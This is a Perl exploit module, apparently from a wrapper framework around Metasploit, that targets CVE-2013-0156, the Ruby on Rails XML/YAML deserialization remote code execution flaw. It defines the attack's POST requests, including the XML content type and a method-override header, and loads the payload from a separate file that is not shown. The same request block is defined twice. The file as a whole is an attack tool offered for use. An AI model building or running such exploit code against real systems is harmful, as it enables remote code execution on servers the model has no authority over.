package RAILS::MSF::RailsXmlYamlCodeExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "RailsXmlYamlCodeExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-0156",
  DESCRIPTION => "

          This module exploits a remote code execution vulnerability in the XML request

        processor of the Ruby on Rails application framework. This vulnerability allows

        an attacker to instantiate a remote object, which in turn can be used to execute

        any ruby code remotely in the context of the application.



        This module has been tested across multiple versions of RoR 3.x and RoR 2.x



        The technique used by this module requires the target to be running a fairly recent

        version of Ruby 1.9 (since 2011 or so). Applications using Ruby 1.8 may still be

        exploitable using the init_with() method, but this has not been demonstrated.



      ",
  MSF_MODULE => "rails_xml_yaml_code_exec",
  OSVDB => 89026,
  REFERENCES => [
    "https://community.rapid7.com/community/metasploit/blog/2013/01/09/serialization-mischief-in-ruby-land-cve-2013-0156",
  ],
  TITLE => "Ruby on Rails XML Processor YAML Deserialization Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => read_file('MSFExploits/RAILS/MSF/src/RailsXmlYamlCodeExec.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'X-HTTP-Method-Override' => 'get',
        'Content-Type' => 'application/xml',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => read_file('MSFExploits/RAILS/MSF/src/RailsXmlYamlCodeExec.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'X-HTTP-Method-Override' => 'get',
        'Content-Type' => 'application/xml',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
